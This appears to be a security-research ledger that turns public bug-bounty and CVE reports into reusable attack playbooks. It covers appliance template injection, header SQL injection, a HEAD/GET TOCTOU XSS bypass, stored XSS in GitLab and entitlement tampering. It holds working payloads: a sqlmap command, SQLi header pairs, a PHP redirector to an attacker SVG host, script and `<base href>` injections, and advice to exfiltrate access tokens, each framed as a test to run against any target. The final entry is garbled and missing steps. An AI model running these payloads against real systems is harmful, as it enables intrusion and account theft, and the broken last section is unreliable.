STATUS: UNVERIFIED (not reproduced) — no GitHub Enterprise Server appliance was touched; the method below is the public advisory's own description, quoted, plus the sibling-CVE family.
CLASS: command injection / privilege escalation in an APPLIANCE MANAGEMENT CONSOLE — a low-privilege "Management Console editor" role can write a configuration field that the backend renders as a HashiCorp NOMAD TEMPLATE, and template rendering executes on the appliance -> admin SSH access (CWE-20/CWE-77; triaged High 7~8.9 by GitHub, CVSS 9.1 in the advisory).
CORE METHOD (the public advisory's own words, quoted, plus the family):
  1. ENTRY POINT, verbatim: "A command injection vulnerability was identified in GitHub Enterprise Server that allowed an attacker with an editor role in the Management Console to gain admin SSH access to the appliance via nomad templates when configuring audit log forwarding."
  2. PRIVILEGE PRECONDITION, verbatim: "Exploitation of this vulnerability required access to the GitHub Enterprise Server instance and access to the Management Console with the editor role." — editor, NOT site administrator.
  3. SINK: the Management Console's configuration fields are rendered as NOMAD TEMPLATES (Go text/template) by the appliance; the audit-log-forwarding configuration is one such field. The Go template package's own security model is the reason this is dangerous — verbatim from `https://pkg.go.dev/text/template`: "The security model used by this package assumes that template authors are trusted. The package does not auto-escape output, so injecting code into a template can lead to arbitrary code execution if the template is executed by an untrusted source."
  4. THE SAME SINK REPEATS ACROSS A SIBLING CONFIG FAMILY (the reporter's family, from the public HackerOne profile + public CVE records): audit log forwarding (CVE-2024-1374), SMTP options (CVE-2024-1378), collectd username/password, HTTP proxy, and the actions-console service URL (CVE-2024-1355). Each is a Management Console configuration field that reaches a template/config renderer.
  5. IMPACT, verbatim: "gain admin SSH access to the appliance".
DETECTION SIGNAL: an appliance / on-prem product with a MANAGEMENT CONSOLE that exposes CONFIGURATION FIELDS rendered as templates or config-as-code by a backend agent (nomad, syslog-ng, collectd, Go text/template); a role that is NOT the site administrator (editor / operator / read-write) able to reach those config fields; a config field whose value is a free-form string/template rather than a validated enum. TELL: the product is an on-prem appliance (GHES, VPN, firewall, storage, k8s control plane) whose Management Console is a separate privileged surface from the user app — and the role gating is COARSE (editor) while the rendered config runs with the appliance's own privileges.
CHAIN: a user with the Management Console EDITOR role (primitive: a low-privilege operator, not admin) -> writes a config field that the appliance renders as a nomad template (primitive: the config field is a template sink, not a validated enum) -> template rendering executes with the appliance's privileges (escalation: command execution on the appliance as the service user) -> admin SSH access on the appliance (impact: full appliance compromise — the box hosting all the tenant's data, secrets and CI/CD; triaged High, CVSS 9.1). A P4-looking "an editor can edit a config field" raised to root on the box.
TRANSFERABLE TEST: on any appliance/on-prem management console, enumerate the configuration fields that are free-form strings or templates (log forwarding, monitoring/collectd, SMTP, HTTP proxy, service URLs, job/template definitions) and, from a NON-administrator editor/operator role, inject template syntax into each — `{{7*7}}` first (a computed `49` in the rendered config, its log or a callback proves server-side template evaluation), then the engine's command-execution primitive (the exact payload for this CVE is NOT published in the public advisory; for Go text/template the documented model is that an untrusted template author reaches code execution). Watch the appliance's rendered config, service logs or a callback for the command output. Rule: **in an appliance Management Console, a config field that is rendered as a template is a command-injection sink — and the role that reaches it is often only "editor", so the chain is low-privilege config write -> template render -> root on the appliance.**

CLASS: SQL injection (boolean-based blind) in an HTTP REQUEST HEADER — the User-Agent header is the sink (CWE-89; triaged Medium).
CORE METHOD (the report's own steps, quoted):
  1. ENTRY POINT: the User-Agent HTTP header on the target site — verbatim: "A SQL injection vulnerability was discovered in the User-Agent parameter of the website `https://██████████/`."
  2. DISCOVERY COMMAND, verbatim: `sqlmap --url "https://█████████/" --batch --random-agent --level 5 --risk 3` — the `--level 5 --risk 3` settings are what make sqlmap test HEADER parameters (User-Agent, Referer, etc.), not just the query/body.
  3. INJECTION POINT, verbatim: "Parameter: User-Agent (User-Agent) / Type: boolean-based blind / Title: OR boolean-based blind - WHERE or HAVING clause / Payload: -5127 OR 2687=2687".
  4. BACKEND, verbatim: "MySQL >= 8.0.0, MariaDB fork".
  5. IMPACT, verbatim: "execute arbitrary SQL commands on the backend database management system ... unauthorized access to sensitive data, manipulation of database content, and even complete compromise of the database server".
DETECTION SIGNAL: a target where the usual parameter/cookie fuzzing finds nothing but the app logs or behaviour suggests header-derived values reach a query; sqlmap reporting a HEADER parameter (User-Agent / Referer / X-Forwarded-For / X-Real-IP) as injectable; a boolean-based blind differential (the page is identical for true/false except for a small rendered difference). TELL: the injection is in a header the app itself sets/reads (User-Agent is often logged into a `user_agent` column or used in a `WHERE ua = '...'` lookup), so it is frequently missed by scanners stuck at `--level 1`.
CHAIN: any unauthenticated/low-privilege visitor (primitive: the header is client-controlled by definition) -> the app concatenates the User-Agent into a SQL query (primitive: header not parameterized) -> boolean-based blind SQLi (primitive: no direct output, one bit per request) -> arbitrary SQL execution on the backend DB (escalation: data read/manipulation, and per the report "complete compromise of the database server") -> cross-tenant/sensitive data exposure (impact; triaged Medium by the DoD program). A P4-looking "I can toggle a boolean" raised to full DB compromise.
TRANSFERABLE TEST: run `sqlmap --url "<target>/" --batch --level 5 --risk 3` (the level/risk that tests headers) OR manually send a pair of requests whose ONLY difference is the User-Agent — `User-Agent: -5127 OR 2687=2687` vs `User-Agent: -5127 OR 2687=2688` — and diff the bodies/length; a differing response proves the header reaches SQL. Then pivot the same test to Referer, X-Forwarded-For, X-Real-IP and any custom `X-*` header. Rule: **headers are SQLi sinks — when parameter fuzzing is clean, raise sqlmap to `--level 5 --risk 3` and diff a boolean-pair payload in every request header.**

New general method -> §17.301.

SOURCE: https://hackerone.com/reports/2106708  2026-11-09
ROUTE: full reporter body read live this pass on the `.json` route -> HTTP 200, 7,967 B, `vulnerability_information` 2,331 B read IN FULL; `visibility: full`. Metadata: HackerOne, "Bypass of #2035332 RXSS at image.hackerone.live via the `url` parameter", weakness Cross-site Scripting (XSS) - Reflected, severity LOW, reporter `sudi`, submitted 2023-08-11 / disclosed 2023-08-22, state Closed, no bounty. The report is explicitly a FIX-BYPASS of an earlier report (#2035332) — that is what makes it a general method rather than a one-off.
STATUS: UNVERIFIED (not reproduced — no HackerOne asset was touched; the request shape and the PHP bypass snippet below are quoted verbatim from the report).
CLASS: reflected XSS / TOCTOU on a remote-resource fetch — a resource proxy that decides whether the fetched content is a SAFE IMAGE by inspecting the `Content-Type` of a HEAD request, then serves the content from a GET request. The two requests are not the same request, so the attacker's server can answer the CHECK differently from the USE (CWE-367 -> CWE-79; triaged Low, but the primitive is the class).
CORE METHOD (the report's own steps, quoted):
  1. ENTRY POINT, verbatim: "input your host in the url parameter: `https://image.hackerone.live:8443/resource/md/get/url?url=http://yourhost/ss.php`" — the endpoint is a SERVER-SIDE PROXY: it fetches whatever `url=` names and returns the body. A proxy's fetch of an attacker URL is the primitive.
  2. THE PATCHED CHECK, verbatim: "After the bug patch, the server now validates the `Content-Type` of the requested resource. The check is done by making a `HEAD` based request to the resource to get the `Content-Type` then if it corresponds to a valid image mime type a second request is made this time `GET` based to retrieve the page resource content." — the validation is a SEPARATE, EARLIER request.
  3. THE BYPASS, verbatim: "Due to the HEAD based check it's very easy to bypass this check, just need to modify the server to response with a different `Content-Type` in case of GET and HEAD request." The attacker's own endpoint branches on the request method — answer the HEAD with an image MIME type, answer the GET with a redirect to the real payload:
     ```php
     <?php
     if ($_SERVER['REQUEST_METHOD'] == 'HEAD') {
         header("Content-Type: image/png");
         exit;
     }
     header("Location: https://sudistark.github.io/evilsvgfile.svg");
     ?>
     ```
  4. THE EXACT NAME FOR THIS DEFECT, verbatim: "TOCTOU (time-of-check to time-of-use): At the time of check the application relies upon HEAD request but at the time of use relies upon GET request this allows the attacker to bypass the protection." The check and the use are TWO REQUESTS to a server the attacker controls, so the state they observe can differ.
  5. SECONDARY GATE (why the browser matters), verbatim: "The server applies sanitization if the `Accept` header is similar to [`Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8`], in case of Safari it does something wierd ... But the server doesn't does any sanitization if the header value is like this: `Accept: */*`" — the sanitizer is keyed on the Accept header, and `*/*` skips it. Send `Accept: */*` as well.
DETECTION SIGNAL: any endpoint that FETCHES a caller-supplied URL server-side and gates the result on a response property of a FIRST request (Content-Type, status, file magic, length) while the payload is delivered by a SECOND request — especially when the two requests can be distinguished by the attacker's server (method, header, order, timing). TELL: the check is a HEAD and the use is a GET. COMPANION TELL: a sanitisation step that is conditional on the request's `Accept` header — `Accept: */*` (or any value outside the expected list) is the switch that disables it.
CHAIN: a proxy/preview endpoint that fetches a URL you supply (primitive: SSRF-shaped fetch with the URL in a parameter) -> the gate is `Content-Type` read from a HEAD, the content is served from a GET (primitive: check and use are different requests to a server you control) -> answer `Content-Type: image/png` to HEAD, redirect the GET to your HTML/SVG (escalation: the fetched body is delivered to the victim's browser as active content) -> send `Accept: */*` so the Accept-keyed sanitiser is skipped -> script executes in the proxy's origin = reflected XSS, and the reporter's own note flags the SSRF direction ("the server is behind cloudflare so I can't directly make a request to the AWS metadata endpoint" — i.e. the same fetch is also an SSRF to the metadata service). Triaged Low by HackerOne. A P4-looking "I can point the proxy at my own host" raised to script execution in the app's origin.
TRANSFERABLE TEST: find every endpoint that takes a URL (`url=`, `src=`, `image=`, `target=`, `link=`, `preview=`, `proxy=`, `fetch=`) and point it at a collaborator/own host that (a) answers HEAD with `Content-Type: image/png` and exits, and (b) answers GET with `302 Location: <your payload host>`; open the resulting proxy URL in a browser with `Accept: */*` and look for your payload to render/execute. Also diff the two requests server-side (method, headers, count) — two requests where one would do is the smell. Rule: **when a server-side fetch is gated by a Content-Type/magic-byte check, make the check and the use DIFFERENT requests from your own server — answer the HEAD with the safe type and the GET with the payload; and check whether the sanitizer is conditional on `Accept`, because `*/*` often switches it off.**
DEDUPE: 0 hits across all three write targets for `2106708`, `2035332`, `image.hackerone.live`. Related-but-recorded material REVIEWED and NOT re-recorded as this method: the ledger's TOCTOU entries are an ASYNC-EXPORT re-authorisation gap, a DNS resolve-then-fetch split, a BD-J path-interpretation split, a privileged-helper signature-check-then-launch symlink swap, a Node sandbox post-check path rewrite, and HTTP/3→HTTP/1 desync races — none is a HEAD-vs-GET content-type gate on a server-side URL fetch; §17.294/§17.295 record an SVG/URL-IRI attribute as a rasterizer FETCH SINK and an XML-converted image as an entity sink, but neither records the CHECK/USE METHOD SPLIT as the bypass, nor the `Accept`-keyed sanitizer switch. New general method -> §17.302.

SOURCE: https://hackerone.com/reports/1256777  2026-11-09
ROUTE: full reporter body read live this pass on the `.json` route -> HTTP 200, 18,239 B, `vulnerability_information` 4,471 B read IN FULL; `visibility: full`. Metadata: GitLab, "Stored XSS in main page of a project caused by arbitrary script payload in group \"Default initial branch name\"", weakness Cross-site Scripting (XSS) - Stored, severity HIGH, reporter `joaxcar`, submitted 2021-07-10 / disclosed 2021-09-15, state Closed, no bounty.
STATUS: UNVERIFIED (not reproduced — no GitLab instance was touched this pass; the steps, the payloads and the two CSP notes below are quoted verbatim from the report).
CLASS: stored XSS from a GROUP-LEVEL SETTING (a "default initial branch name") rendered into a generated CODE SNIPPET / shell-command instruction block on a project's landing page — i.e. a trusted, admin-configurable value is interpolated into a `<code>`/terminal sample without escaping (CWE-79; triaged High).
CORE METHOD (the report's own steps, quoted):
  1. PRECONDITION, verbatim: "Any user that is either at least developer of the project, or an administrator of the GitLab instance, and access the project URL will trigger the payload." — the victim is a DEVELOPER or an ADMIN, not an ordinary reader.
  2. ENTRY POINT — a GROUP SETTING, not a project field: verbatim, "Go to `https://gitlab.domain.com/groups/attack_group/-/settings/repository` and expand the \"Default initial branch name\" tab" then "Enter `<script>alert(1);</script>` as \"Default initial branch name\" and click \"save changes\"". Verbatim summary: "The field \"default branch name\" under https://gitlab.com/groups/group_name/-/settings/repository accepts arbitrary text (long JavaScript strings as an example)."
  3. TRIGGER — create an EMPTY project in that group: verbatim, "Go to https://gitlab.domain.com/groups/attack_group and click the button \"New project\" and choose to create a \"Create blank project\"" — "Now the project will load and the alert should pop up." The stored value is consumed only when a project has NO initial repository, so the landing page renders the "set up your repository" instruction block.
  4. WHY THE SINK IS DANGEROUS, verbatim: "When a project without a initial repository is created in the group the developers are presented with an information page with example terminal commands to execute to set up a repository. This information includes two unzanatized inclusions of the \"default branch name\", resulting in execution of the JavaScript payload." — the value is placed into a TERMINAL-COMMAND EXAMPLE, a context where `<`, `>` and quotes are natural, so the developer's own template never escapes it.
  5. DELIVERY (why the victim is a developer): verbatim, "All the attacker needs to do is invite targeted victim users as `Developers` to the project. This will trigger GitLab to send out information to the victim (emails or notifications) that will work as validated phishing links ... The victim just need to click the link in the email and land on the project main page."
  6. TWO SEPARATE CSP FINDINGS, verbatim: "As a default self-hosted GitLab instance does not enforce any CSP rules any javascript can be called. Including inclusion of external script files (`<script src=\"external_script\"></script>`). On GitLab.com I have not been able to bypass the CSP except from changing the `base-uri` which causes all links on the page(including navigation bars) to point to the attackers site (with payload `<Base Href=\"attacker_site\">`)." And the payoff: "On a self-hosted instance without proper CSP I was able to generate `personal access tokens` from the victim that could be extracted by the attacker to get complete access to the victims content and actions. If the victim is an Administrator this leads to complete access to the system."
DETECTION SIGNAL: any GROUP / ORG / TENANT-level DEFAULT setting whose value is interpolated into a GENERATED INSTRUCTION — "default branch name", default project name, default README, default `.gitignore`, default CI template, onboarding/checkout shell-command samples, "run this to get started" blocks. TELL: the value is stored in the group's settings (a surface with a LOW victim count and high trust) but rendered in a page a DIFFERENT user opens (the project landing page). COMPANION TELL: a `<code>`/`<pre>` block containing a branch name or a project name — if the sample is built by string concatenation, the branch name is the injection point. SECONDARY TELL: a CSP whose only effect is on SCRIPT execution — `<base href=...>` rewrites every relative URL on the page (nav, actions, links) to the attacker's host even when script is blocked.
CHAIN: a group owner/maintainer sets "Default initial branch name" (primitive: an ordinary, trusted admin action, invisible to the victim) -> the value is stored unsanitised and rendered into the generated terminal-command example on any project created without a repository (primitive: unescaped interpolation into a code sample) -> the attacker invites a targeted victim as a Developer, so GitLab itself emails a validated link to the project page (escalation: trusted-channel delivery to a developer/admin) -> the victim opens the project main page and the payload runs in the app origin (primitive: stored XSS) -> on a self-hosted instance with no CSP, generate the victim's personal access tokens and exfiltrate them = full account access, and "If the victim is an Administrator this leads to complete access to the system" (impact; triaged High). A P4-looking "an admin can set a branch name" raised to instance compromise.
TRANSFERABLE TEST: in any multi-tenant dev platform, enumerate the GROUP/ORG/TENANT settings that produce DEFAULT VALUES for new objects (default branch name, default project/repo name, default README, default template, default CI config, onboarding snippet) and set each to `<script>alert(document.domain)</script>`; then create the empty/no-content object that renders the instruction block and open it AS A SECOND USER (developer/admin), checking the raw HTML for unescaped `<`. If a CSP blocks inline script, retest the same stored value with `<base href="//attacker">` to prove the page's own links/actions are rewritable. Rule: **a group-level default value that lands in a generated shell-command/instruction sample is an unescaped sink — store the payload in the SETTINGS, not the project, and let the app's own invitation email deliver it to a developer/admin victim.**
DEDUPE: 0 hits across all three write targets for `1256777`, `Default initial branch name`, `default branch`. Related-but-recorded material REVIEWED and NOT re-recorded as this method: §17.26 (GitLab Kroki) and §17.27 (GitLab Customer Relations `/add_contacts`) are GitLab stored-XSS entries, but §17.26's sink is a CSS-selector/reader-node MISMATCH inside a diagram renderer (`pre > code[lang]`), and §17.27's sink is a NAME field rendered by a secondary quick-action picker — neither records a GROUP SETTING consumed by a generated instruction block; the ledger's `base-uri` hit (~line 21750) is a framework-reserved-routing-key CSP bypass (authority/scheme injection in generated URLs), not a stored `<base href>` payload. New general method -> §17.303.

ROUTE: full reporter body read live this pass on the `.json` route -> HTTP 200, 23,889 B, `vulnerability_information` 3,650 B read IN FULL; `visibility: full`. Metadata: Logitech, "Manipulating response leads to free access to Streamlabs Prime", weakness Business Logic Errors, severity MEDIUM, reporter `sudi`, submitted 2021-01-03 / disclosed 2021-01-21, state Closed, no bounty.
STATUS: UNVERIFIED (not reproduced — no Streamlabs/Logitech asset was touched; the endpoints, the Match-and-Replace rules and the observed outcome are quoted verbatim from the report).
CLASS: business logic / client-side entitlement — a SUBSCRIPTION ENTITLEMENT is decided by a JSON response the CLIENT reads, and the client never re-validates with the server, so rewriting the response body in transit (proxy Match-and-Replace) flips the account into a paid tier and unlocks the paid features, including a physical-goods reward (CWE-840 / CWE-602; triaged Medium, monetary).
CORE METHOD (the report's own steps, quoted):
  1. And as expected I got access to some of the prime features, the most interesting one was the streamlabs All Stars rewards".
  3. THE EXACT PROXY RULES, verbatim — `1st. Type: Response Body / Match: false / Replace: true` and `2nd. Type: Response Body / Match: "blocked":true / Replace: "blocked":false`.
  4. OBSERVED OUTCOME 1 (a paid reward unlocked), verbatim: "When a user which doesn't have the Streamlabs Prime tries to access the streamlabs-reward endpoint the *reedeemed* option won't be there" — and after the rule it is.   5. OBSERVED OUTCOME 2 (a paid feature's secrets disclosed), verbatim: "I checked other features too like Multistreaming, I was able to get the *RTMP url* and *Stream key*` at `https://streamlabs.com/dashboard#/multistream/settings`".
